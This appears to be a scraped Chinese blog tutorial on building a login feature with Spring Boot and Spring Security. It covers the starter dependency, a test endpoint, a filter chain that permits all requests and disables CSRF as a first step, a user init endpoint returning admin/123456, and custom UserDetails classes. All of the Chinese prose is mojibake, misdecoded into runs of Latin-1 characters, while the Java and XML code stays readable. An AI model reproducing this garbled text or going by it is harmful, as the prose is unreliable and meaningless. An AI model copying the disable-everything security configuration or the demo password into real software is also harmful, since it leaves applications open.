pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8536f4886ac940fd83427b331dc79194~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55Sz6Ziz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769488&amp;x-signature=Ej5dQCQqzxlkU6JDfVSLkghK8F0%3D" alt="image-20251204151559125.png" loading="lazy"/></p>
<h2 data-id="heading-0">ä¸€ã€å‰è¨€</h2>
<p>å›å½’ä¸»çº¿ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è¦å®Œæˆç™»å½•çš„åŠŸèƒ½ï¼Œåœ¨å¼€å§‹å‰ï¼Œæˆ‘å¸Œæœ›ä½ èƒ½æŠ›å¼ƒä¹‹å‰å¯¹åå°ç®¡ç†ç³»ç»Ÿçš„åˆ»æ¿å°è±¡ï¼Œæ¯”å¦‚<code>RBAC</code> æƒé™æ¨¡å‹ï¼Œ<code>token</code> ç”¨ <code>JWT</code> è¿˜æ˜¯ <code>UUID</code>ï¼Ÿå­˜ <code>Cookie</code> è¿˜æ˜¯ <code>Session</code>ï¼ŸæŠŠè¿™äº›é€šé€šæŠ›ä¹‹è„‘åï¼Œä»¥å…·ä½“çš„ä¸šåŠ¡é©±åŠ¨ï¼Œå½“æˆ‘ä»¬çœŸçš„éœ€è¦ä½¿ç”¨åˆ° <code>jwt</code> æˆ–è€… <code>RBAC</code> çš„æ—¶å€™å†å°†å®ƒä»¬é‡æ‹¾èµ·æ¥ã€‚</p>
<h2 data-id="heading-1">äºŒã€ç™»å½•é€»è¾‘æ¢³ç†</h2>
<p>ä¸ºä»€ä¹ˆè¦ç™»å½•ï¼Œå¯ä¸å¯ä»¥ä¸è¦ç™»å½•ï¼Ÿ</p>
<p>å½“ç„¶å¯ä»¥ï¼Œæˆ‘çŸ¥é“ä½ è‚¯å®šè®¤ä¸ºæˆ‘åœ¨æŠ¬æ ï¼Œå¬æˆ‘è§£é‡Šã€‚</p>
<blockquote>
<p>é¦–å…ˆå‰ææ˜¯ï¼ŒæœåŠ¡ç«¯é‡Œæœ‰ä¸€ä»½åå•ï¼Œè¿™ä»½åå•é‡Œé¢æœ‰ç€ç³»ç»Ÿç”¨æˆ·çš„ä¿¡æ¯ï¼Œã€ç”¨æˆ·åã€‘ + ã€å¯†ç ã€‘</p>
</blockquote>
<p>æœ¬è´¨ä¸Šåªè¦æˆ‘åœ¨è¯·æ±‚å—é™åˆ¶çš„èµ„æºæ—¶ï¼Œå‘Šè¯‰ä½ æˆ‘æ˜¯è°ï¼Œæ˜¯ä¸æ˜¯å°±å¯ä»¥äº†ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯æ¬¡æˆ‘è¯·æ±‚çš„æ—¶å€™ï¼Œéƒ½å¸¦ä¸Š ã€ç”¨æˆ·åã€‘ + ã€å¯†ç ã€‘</p>
<p>æœåŠ¡ç«¯åœ¨å¤„ç†æˆ‘çš„è¯·æ±‚çš„æ—¶å€™ï¼Œåœ¨åå•ä¸Šå¯¹ç…§ç€æŸ¥ï¼Œæ‰¾åˆ°äº†ï¼Œè¯æ˜æˆ‘æ˜¯åˆæ³•ç”¨æˆ·ï¼Œå°±è¯¥ç»™æˆ‘è¿”å›æ­£ç¡®çš„ç»“æœã€‚</p>
<p>æŠ›å¼€å…¶å®ƒè€ƒè™‘ï¼Œè¿™æ ·æ²¡æœ‰ä»»ä½•é—®é¢˜ã€‚</p>
<p>é‚£æŠŠæŠ›å¼€çš„æ¡å›æ¥ï¼Œä¸ºä»€ä¹ˆä¸è¿™ä¹ˆåšï¼š</p>
<ul>
<li>æ¯æ¬¡è¯·æ±‚ä½ è®©ç”¨æˆ·è¾“å…¥ç”¨æˆ·åå¯†ç ï¼Œé‚£ç”¨æˆ·ä¸çŸ¥é“è·‘å“ªå»äº†</li>
<li>èªæ˜çš„ä½ æƒ³åˆ°æŠŠç”¨æˆ·åå¯†ç ä¿å­˜åœ¨å®¢æˆ·ç«¯ï¼Œç›´æ¥è‡ªåŠ¨å¸¦è¿‡å»ï¼Œå¥½çš„ï¼Œç›—å·é£é™©ç›´æ¥æ‹‰æ»¡äº†ã€‚</li>
</ul>
<p>æ‰€ä»¥å¾ˆè‡ªç„¶çš„æ¼”å˜æˆäº†è¿™ç§æ–¹å¼ï¼Œåœ¨æ­£å¼è®¿é—®ç³»ç»Ÿèµ„æºæ—¶å…ˆç™»å½•ï¼Œä½¿ç”¨ã€ç”¨æˆ·åã€‘ + ã€å¯†ç ã€‘ç™»å½•ï¼ŒæœåŠ¡ç«¯éªŒè¯åˆæ³•åï¼Œè¿”å›ç»™å®¢æˆ·ç«¯ä¸€ä¸ªå¯†é’¥ï¼Œä¹Ÿå°±æ˜¯ <code>token</code> ï¼Œæ‰€ä»¥åœ¨åå•ä¸Šï¼Œæˆ‘çš„ä¿¡æ¯å˜æˆäº† ã€ç”¨æˆ·åã€‘ + ã€å¯†ç ã€‘+ ã€tokenã€‘, ä»¥åæˆ‘åªè¦å¸¦ä¸Š <code>token</code> å°±å¯ä»¥äº†ã€‚</p>
<p><strong>é€šè¿‡ç™»å½•å¼•å…¥ <code>token</code>ï¼Œè§£å†³äº†é¢‘ç¹è¾“å…¥ç”¨æˆ·åå¯†ç çš„é—®é¢˜ã€‚</strong></p>
<blockquote>
<p>åˆ°è¿™é‡Œå…¶å®å°±å·²ç»å¾ˆæ¸…æ¥šäº†ï¼Œç™»å½•ï¼Œå°±æ˜¯ç”¨ ã€ç”¨æˆ·åã€‘ + ã€å¯†ç ã€‘ï¼Œæ¢ä¸€æŠŠé’¥åŒ™ã€‚æ— è®ºä½ æ€ä¹ˆåšï¼Œæœ€ç»ˆéƒ½æ˜¯å›´ç»•ç€è¿™ä»¶äº‹å±•å¼€ã€‚</p>
</blockquote>
<p>é‚£æˆ‘ä»¬å¼€å§‹ç¼–ç äº†ï¼Œå…¶å®æˆ‘åŸæœ¬æ˜¯æƒ³ç”¨ <code>Sa-Token</code> çš„ï¼Œä½†æ˜¯å‘ç° <code>SpringBoot4</code> ä¸é€‚é… , æ‰€ä»¥è¿˜æ˜¯ä½¿ç”¨äº† <code>Spring Security</code> ï¼Œå®˜æ–¹æŒ‡å®šæ— éœ€è€ƒè™‘å…¼å®¹æ€§é—®é¢˜ï¼Œä¸‹é¢å‚è€ƒä¸€ä¸‹  <code>Sa-Token</code> çš„ç™»å½•è®¤è¯æµç¨‹å›¾ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d43fefeac6994c109e3016441d6b4f5b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55Sz6Ziz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769488&amp;x-signature=VtChOsEY1gh%2Fa3rXfPyQOgIbsHo%3D" alt="image-20251204151559125" loading="lazy"/></p>
<h2 data-id="heading-2">ä¸‰ã€æ•´åˆ Spring Security</h2>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-security<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>å½“æˆ‘ä»¬å¼•å…¥è¿™ä¸ªä¾èµ–åï¼Œæ•´åˆå°±å·²ç»å®Œæˆäº†ã€‚</p>
<p>å¯åŠ¨é¡¹ç›®ï¼Œå¯ä»¥çœ‹åˆ°æ§åˆ¶å°è¾“å‡º</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ca80965d09964487b8446cd14135cf10~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55Sz6Ziz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769488&amp;x-signature=bybbPBpqpMTCmLemfvLGDpqEumg%3D" alt="image.png" loading="lazy"/></p>
<p>æˆ‘ä»¬å†™ä¸€ä¸ªæ¥å£æµ‹è¯•ä¸€ä¸‹</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/system/auth")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AuthController</span> {

    <span class="hljs-meta">@GetMapping("/hello")</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"hello world"</span>;
    }

}
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/70b558d48cbd437482c30355128f31ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55Sz6Ziz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769488&amp;x-signature=ci0WLrxXUzJKq4NwyEM4cGadGq8%3D" alt="image-20251204161205523" loading="lazy"/></p>
<p>é¡µé¢è·³è½¬åˆ°äº†ç™»å½•ç•Œé¢ã€‚</p>
<p>æˆ‘ä»¬è¾“å…¥æ§åˆ¶å°çš„å¯†ç ï¼Œé»˜è®¤ç”¨æˆ·åä¸º userï¼Œç™»å½•æˆåŠŸåï¼Œè¯·æ±‚æ­£å¸¸</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/40e2a938449b4ba6b2c0b595c4d0b6b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55Sz6Ziz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769488&amp;x-signature=%2FHiS1DEUI7RQZtSHtlCfQmvl0SQ%3D" alt="image-20251204161325779" loading="lazy"/></p>
<p>å¹¶ä¸”æˆ‘ä»¬å‘ç°ï¼Œé€šè¿‡ <code>Cookie</code> å¾€æœåŠ¡ç«¯ä¼ äº†ä¸ª <code>JSESSIONID</code></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6035473f78c84d169329c7ca9f253ddb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55Sz6Ziz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769488&amp;x-signature=6ljWkwkT1%2BJrQ11Ded6Q%2Bd7ps8I%3D" alt="image-20251204161608259" loading="lazy"/></p>
<p>æ˜¯ä¸æ˜¯å¾ˆç†Ÿæ‚‰è¿™å¥—æ“ä½œï¼Œæ‹¿ ã€ç”¨æˆ·åã€‘ + ã€å¯†ç ã€‘æ¢æ¥äº†  <code>JSESSIONID</code>ã€‚</p>
<p>è‡³äº <code>Spring Security</code> èƒŒåå¸®æˆ‘ä»¬åšäº†äº›ä»€ä¹ˆå…¶å®ƒæ“ä½œï¼ˆæ¯”å¦‚è¿™ä¸ªç™»å½•è¡¨å•å“ªæ¥çš„ï¼Ÿï¼‰ï¼Œæˆ‘ä»¬æš‚ä¸”ä¸æ·±ç©¶ï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“ï¼Œä»–æœ¬è´¨ä¸Šå…¶å®å°±æ˜¯å®Œæˆäº†è¿™ä¹ˆä¸ªæµç¨‹ã€‚</p>
<p>å½“ç„¶è¿™ä¸ªåªæ˜¯ä»–çš„é»˜è®¤æœºåˆ¶ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬åªéœ€è¦éµå¾ªæ¡†æ¶è¦æ±‚ï¼Œå®Œæˆæˆ‘ä»¬è‡ªå·±çš„å®šåˆ¶åŒ–ä¿®æ”¹å°±å¥½äº†ã€‚</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥å®Œæˆè¿™ä¸ªæ”¹é€ å·¥ä½œã€‚</p>
<h2 data-id="heading-3">å››ã€è‡ªå®šä¹‰ç™»å½•æµç¨‹</h2>
<p>å› ä¸ºæˆ‘è¿™ä¸æ˜¯ <code>SpringSecurity</code> çš„æ•™ç¨‹ï¼Œæˆ‘ä¸åœ¨è¿™é‡Œå¤§ç¯‡å¹…çš„ä»‹ç»å®ƒã€‚å¦‚æœä¸€ç‚¹éƒ½ä¸äº†è§£çš„ï¼Œæˆ‘å»ºè®®å…ˆå»å­¦ä¹ ä¸€ä¸‹ã€‚å®˜ç½‘åœ°å€ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.spring.io%2Fspring-boot%2Freference%2Fweb%2Fspring-security.html" target="_blank" title="https://docs.spring.io/spring-boot/reference/web/spring-security.html" ref="nofollow noopener noreferrer">docs.spring.io/spring-bootâ€¦</a></p>
<p><strong>æ‹¿ã€ç”¨æˆ·åã€‘ + ã€å¯†ç ã€‘æ¢ã€Tokenã€‘</strong> æ—¶åˆ»è®°ä½è¿™å¥è¯ã€‚</p>
<h3 data-id="heading-4">4.1. å…³é—­é»˜è®¤çš„å®‰å…¨é…ç½®</h3>
<p>æˆ‘ä»¬åªéœ€è¦è‡ªå·±æ·»åŠ ä¸€ä¸ªç±»å‹ä¸º <code>SecurityFilterChain</code> çš„ <code>bean</code> å³å¯ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableWebSecurity</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityConfig</span> {

    <span class="hljs-comment">/**
     * æœ€å°åŒ–çš„å®‰å…¨è¿‡æ»¤é“¾é…ç½®
     * å®Œå…¨å…è®¸æ‰€æœ‰è¯·æ±‚ï¼Œä¸è¿›è¡Œä»»ä½•è®¤è¯å’Œæˆæƒ
     */</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> SecurityFilterChain <span class="hljs-title function_">filterChain</span><span class="hljs-params">(HttpSecurity http)</span> <span class="hljs-keyword">throws</span> Exception {
        http
                <span class="hljs-comment">// å®Œå…¨ç¦ç”¨æ‰€æœ‰å®‰å…¨åŠŸèƒ½</span>
                .authorizeHttpRequests(authorize -&gt; authorize
                        <span class="hljs-comment">// å…è®¸æ‰€æœ‰è¯·æ±‚è®¿é—®</span>
                        .anyRequest().permitAll()
                )
                <span class="hljs-comment">// ç¦ç”¨CSRFä¿æŠ¤</span>
                .csrf(csrf -&gt; csrf.disable())
                <span class="hljs-comment">// ç¦ç”¨è¡¨å•ç™»å½•</span>
                .formLogin(form -&gt; form.disable())
                <span class="hljs-comment">// ç¦ç”¨HTTPåŸºæœ¬è®¤è¯</span>
                .httpBasic(basic -&gt; basic.disable())
                <span class="hljs-comment">// ç¦ç”¨ä¼šè¯ç®¡ç†</span>
                .sessionManagement(session -&gt; session.disable());

        <span class="hljs-keyword">return</span> http.build();
    }

    <span class="hljs-comment">/**
     * é…ç½®ä¸€ä¸ªç©ºçš„UserDetailsServiceï¼Œå…³é—­é»˜è®¤çš„UserDetailsServiceé…ç½®
     * è¿™æ ·å°±å®Œå…¨ç¦ç”¨äº†Spring Securityçš„é»˜è®¤å®‰å…¨åŠŸèƒ½
     */</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> UserDetailsService <span class="hljs-title function_">userDetailsService</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// è¿”å›ä¸€ä¸ªç©ºçš„InMemoryUserDetailsManagerï¼Œä¸åŒ…å«ä»»ä½•ç”¨æˆ·</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryUserDetailsManager</span>();
    }
}
</code></pre>
<p>é‡å¯åå‘ç°ï¼Œå¦‚æˆ‘ä»¬æ‰€æ„¿ï¼Œä¼¼ä¹ä¸€åˆ‡éƒ½æ²¡æœ‰å‘ç”Ÿè¿‡ä¸€æ ·</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/699d426c8cb04f809c1439a03577014d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55Sz6Ziz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769488&amp;x-signature=ZUg8IvL%2BA%2F82C6nL2Igj8Cx2u5E%3D" alt="image-20251204171518308" loading="lazy"/></p>
<blockquote>
<p>ç°åœ¨æˆ‘ä»¬å°±è¦å¼€å§‹å®Œæˆæˆ‘ä»¬è‡ªå·±çš„é€»è¾‘äº†ï¼Œå¦‚æœæ²¡æœ‰ç”¨æ¡†æ¶ï¼Œæˆ‘ä»¬ä¼šæ€ä¹ˆå®ç°</p>
<p>é¦–å…ˆé€šè¿‡è¯·æ±‚ä¼ å‚ç»™æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯æ‹¿åˆ°å‚æ•°æ ¹æ®ç”¨æˆ·åæŸ¥è¯¢æ•°æ®åº“ï¼Œå¯¹æ¯”å¯†ç ï¼Œå¦‚æœæ­£ç¡®ï¼Œåˆ›å»ºä¸ª <code>token</code>ï¼Œ<code>token</code> ä¸ç”¨æˆ·å…³è”ï¼Œç„¶åå°† <code>token</code> è¿”å›ç»™å‰ç«¯ã€‚</p>
<p>ç°åœ¨å€ŸåŠ©æ¡†æ¶ï¼Œæˆ‘ä»¬å¦‚ä½•æŠŠä¸Šé¢è¿™äº›æ­¥éª¤å®‰æ’ç»™å®ƒæ¥å¸®æˆ‘ä»¬å®Œæˆï¼Ÿ</p>
</blockquote>
<h3 data-id="heading-5">4.2. è‡ªå®šä¹‰é…ç½®</h3>
<p>é»˜è®¤æƒ…å†µä¸‹æ˜¯é€šè¿‡è¡¨å•æ¥æ¥æ”¶å‚æ•°çš„ï¼Œæ¡†æ¶å¸®æˆ‘ä»¬å®ç°äº†ä¸€ä¸ª <code>/login</code> è¯·æ±‚ï¼Œèµ°çš„æ¡†æ¶è‡ªå¸¦çš„è®¤è¯æµç¨‹ã€‚</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬è¦é¡ºç€æˆ‘ä»¬è‡ªå·±çš„æ€è·¯æ¥ï¼Œé€šè¿‡ <code>controller</code> æ¥æ”¶è¯·æ±‚ï¼Œä¸»åŠ¨å»ä½¿ç”¨ <code>SpringSecurity</code> å¸®æˆ‘ä»¬éªŒè¯ã€‚ç®€å•æ¥è¯´å°±æ˜¯æŠŠæ¥æ”¶å‚æ•°å‰é¢è¿™æ®µææ–­ï¼Œä»è‡ªåŠ¨ä»è¿‡æ»¤å™¨ä¸­è·å–å‚æ•°ï¼Œæ”¹æˆæˆ‘ä»¬è‡ªå·±æ¥è·å–ã€‚</p>
<blockquote>
<p>è¿™é‡Œå¦‚æœç»†è¯´ï¼Œæ–‡ç« å°±å¤ªå•°å—¦äº†ï¼Œæˆ‘åˆ—å‡ºå…³é”®ç‚¹ï¼Œå®Œæ•´ä»£ç å¤§å®¶å¯ä»¥å»ä»£ç ä»“åº“æŸ¥çœ‹ã€‚</p>
</blockquote>
<h4 data-id="heading-6">4.2.1 åˆ›å»ºç”¨æˆ·</h4>
<blockquote>
<p>è¿™å…¶å®å°±æ˜¯æœåŠ¡ç«¯è¦ç°æœ‰ä¸€ä¸ªåå•ï¼Œåˆ›å»ºç”¨æˆ·å°±æ˜¯å¾€åå•ä¸ŠåŠ ä¿¡æ¯ã€‚</p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@PostMapping("/init")</span>
<span class="hljs-keyword">public</span> Result&lt;Void&gt; <span class="hljs-title function_">initUser</span><span class="hljs-params">()</span> {
    userService.initUser();
    <span class="hljs-keyword">return</span> Result.success(<span class="hljs-string">"åˆå§‹åŒ–ç”¨æˆ·æˆåŠŸ ç”¨æˆ·åï¼šadmin å¯†ç ï¼š123456 "</span>);
}
</code></pre>
<h4 data-id="heading-7">4.2.2 è‡ªå®šä¹‰ç”¨æˆ·å®‰å…¨ä¿¡æ¯å¯¹è±¡ CustomUserDetails</h4>
<p>è¿™é‡Œæœ‰çš„äººå–œæ¬¢ç›´æ¥åˆ©ç”¨æ•°æ®å±‚å¯¹è±¡ï¼Œåœ¨ <code>User</code> ä¸Šç›´æ¥å»å®ç° <code>UserDetails</code> ï¼Œè¿™ç§åšæ³•åœ¨ä»¥å‰çš„é¡¹ç›®ä¸­å¾ˆå¸¸è§ï¼Œä½†æ˜¯ï¼Œæˆ‘æƒ³è¯´çš„æ˜¯ï¼Œä¸åˆç†ã€‚</p>
<ul>
<li><strong>ç ´åäº†å…³æ³¨ç‚¹åˆ†ç¦»åŸåˆ™</strong></li>
</ul>
<blockquote>
<p>æ•°æ®å®ä½“ï¼ˆEntityï¼‰çš„æ ¸å¿ƒèŒè´£åœ¨äº<strong>ä¸šåŠ¡é¢†åŸŸå»ºæ¨¡å’Œæ•°æ®æŒä¹…åŒ–</strong>ï¼Œè€Œ <code>UserDetails</code>æ¥å£æ˜¯<strong>å®‰å…¨æ¡†æ¶çš„è®¤è¯å¥‘çº¦</strong>ã€‚å°†ä¸¤è€…è€¦åˆï¼Œæ„å‘³ç€åŒä¸€ä¸ªç±»éœ€è¦åŒæ—¶æ‰¿æ‹…æ•°æ®æ˜ å°„ä¸å®‰å…¨é€‚é…ä¸¤ç§æˆªç„¶ä¸åŒçš„èŒè´£ï¼Œè¿™æ˜¾è‘—é™ä½äº†ä»£ç çš„å†…èšæ€§å’Œå¯ç»´æŠ¤æ€§ã€‚</p>
</blockquote>
<ul>
<li><strong>é€ æˆäº†ä¸å¿…è¦çš„æ¡†æ¶è€¦åˆä¸ä¾µèš€</strong></li>
</ul>
<blockquote>
<p>æ•°æ®å±‚åº”æ˜¯ç›¸å¯¹ç¨³å®šã€ç‹¬ç«‹çš„åŸºç¡€è®¾æ–½ã€‚ç›´æ¥å®ç° <code>UserDetails</code>ä¼šå°†æ•°æ®å®ä½“ä¸ Spring Security è¿™ä¸€å…·ä½“çš„å®‰å…¨å®ç°æ¡†æ¶<strong>å¼ºç»‘å®š</strong>ï¼Œä½¿å¾—é¢†åŸŸæ¨¡å‹è¢«æŠ€æœ¯å®ç°ç»†èŠ‚æ‰€â€œæ±¡æŸ“â€ã€‚è¿™å¯¼è‡´æœªæ¥æ›´æ¢ã€å‡çº§æˆ–ç§»é™¤å®‰å…¨æ¡†æ¶æ—¶ï¼Œé‡æ„æˆæœ¬é«˜æ˜‚ï¼Œå¹¶ä¸¥é‡æŸå®³äº†æ ¸å¿ƒä¸šåŠ¡æ¨¡å‹çš„å¯ç§»æ¤æ€§ã€‚</p>
</blockquote>
<p>æ­£ç¡®çš„åšæ³•</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å®‰å…¨å±‚å¯¹è±¡  UserDetailså®ç°ç±»ã€ç”¨æˆ·è¯¦æƒ…å¯¹è±¡ã€å®‰å…¨ç”¨æˆ·å¯¹è±¡</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomUserDetails</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserDetails</span> { 
	<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> User user;  <span class="hljs-comment">// ç»„åˆè€Œéç»§æ‰¿</span>
   ...
}  
</code></pre>
<h4 data-id="heading-8">4.2.3 è‡ªå®šä¹‰ UserDetailsService å®ç° loadUserByUsername æ–¹æ³•</h4>
<p>è¿™ä¸ªæ˜¯æœåŠ¡ç«¯è¿›è¡Œå¯¹ç…§çš„å…³é”®æ­¥éª¤ï¼Œç­‰ä»·äºï¼Œä»åå•ä¸Šæ‰¾å‡ºç¬¦åˆçš„ç”¨æˆ·ä¿¡æ¯ã€‚æ³¨æ„è¿™é‡Œåªéœ€è¦å°†åå•ä¸Šçš„ç”¨æˆ·ä¿¡æ¯ç»„è£…æˆ **å®‰å…¨ç”¨æˆ·å¯¹è±¡ ** <code>CustomUserDetails</code> å³å¯ï¼Œå…·ä½“çš„å¯†ç æ ¡éªŒé€»è¾‘ï¼Œæ¡†æ¶ä¼šå¸®æˆ‘ä»¬å®Œæˆã€‚å…·ä½“ç»†èŠ‚å¯ä»¥çœ‹ <code>DaoAuthenticationProvider</code> â€“&gt; <code>retrieveUser</code> æ–¹æ³•ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RequiredArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomUserDetailsService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserDetailsService</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> UserRepository userRepository;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-meta">@NullMarked</span> UserDetails <span class="hljs-title function_">loadUserByUsername</span><span class="hljs-params">(String username)</span> <span class="hljs-keyword">throws</span> UsernameNotFoundException {
        <span class="hljs-comment">// ä»æ•°æ®åº“æŸ¥æ‰¾ç”¨æˆ·ï¼Œæ‰¾ä¸åˆ°åˆ™æŠ›å‡ºå¼‚å¸¸</span>
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> userRepository.findByUsername(username)
            .orElseThrow(() -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">UsernameNotFoundException</span>(<span class="hljs-string">"ç”¨æˆ·ä¸å­˜åœ¨: "</span> + username));
        <span class="hljs-comment">// è¿”å›çš„ UserDetails å¯¹è±¡åŒ…å«äº†ç”¨æˆ·çš„å¯†ç å’Œæƒé™ä¿¡æ¯ï¼ŒSpring Security ä¼šç”¨å®ƒè¿›è¡Œè®¤è¯</span>
        <span class="hljs-type">CustomUserDetails</span> <span class="hljs-variable">customUserDetails</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomUserDetails</span>();
        customUserDetails.setUser(user);
        <span class="hljs-keyword">return</span> customUserDetails;
    }
}
</code></pre>
<h4 data-id="heading-9">4.2.4 è‡ªå®šä¹‰ Spring Security é…ç½®ç±»</h4>
<p>äº‹å®ä¸Šæˆ‘ä»¬åªéœ€è¦è‡ªå®šä¹‰å¥½ <code>CustomUserDetailsService</code> å°±å·²ç»å®Œæˆäº†åŸºæœ¬é…ç½®ï¼Œå‰©ä¸‹çš„åªéœ€è¦æ ¹æ®æˆ‘ä»¬çš„éœ€è¦æ¥è¿›è¡Œé…ç½®è¿‡æ»¤å™¨é“¾å°±å¯ä»¥äº†ã€‚</p>
<p>å…·ä½“çš„é»˜è®¤é…ç½®æƒ…å†µï¼Œå‚è€ƒæºç ï¼š<code>InitializeUserDetailsBeanManagerConfigurer</code> è¿™é‡Œäº¤ä»£çš„å¾ˆæ¸…æ¥šã€‚</p>
<blockquote>
<p>ä½†æ˜¯ä½ ä¼šå‘ç°ï¼Œæˆ‘çš„é…ç½®ç±»ä¸­åŠ äº†è¿™ä¹ˆä¸€æ®µ</p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Bean</span>
<span class="hljs-keyword">public</span> AuthenticationManager <span class="hljs-title function_">authenticationManager</span><span class="hljs-params">(AuthenticationConfiguration authConfig)</span> <span class="hljs-keyword">throws</span> Exception {
    <span class="hljs-comment">// ä»é…ç½®ä¸­è·å–é»˜è®¤çš„AuthenticationManager</span>
    <span class="hljs-comment">// å¦‚æœé…ç½®äº†AuthenticationProviderï¼Œå®ƒä¼šè‡ªåŠ¨ä½¿ç”¨è¿™äº›Provider</span>
    <span class="hljs-keyword">return</span> authConfig.getAuthenticationManager();
}
</code></pre>
<p>å½“æˆ‘åœ¨åˆšå­¦ä¹  <code>SpringSecurity</code> æ—¶ï¼Œçœ‹åˆ°å¾ˆå¤šå‚è€ƒé¡¹ç›®ï¼Œå‘ç°æœ‰çš„è¿™æ ·é…ç½®ï¼Œæœ‰çš„é‚£æ ·é…ç½®ï¼ŒåªçŸ¥é“è¿™ä¹ˆé…ç½®å°±å¯ä»¥ï¼Œä½†æ˜¯ä¸€ç›´ä¸æ˜ç™½ä¸ºä»€ä¹ˆï¼Ÿ</p>
<p>æ¯”å¦‚è¿™é‡Œï¼Œå‰é¢å·²ç»æåˆ°äº†ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œæ˜æ˜å·²ç»æä¾›äº†ä¸€ä¸ª <code>AuthenticationManager</code> ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆè¿˜è¦åœ¨è¿™é‡Œæ˜¾ç¤ºé…ç½® AuthenticationManager ï¼Ÿ</strong></p>
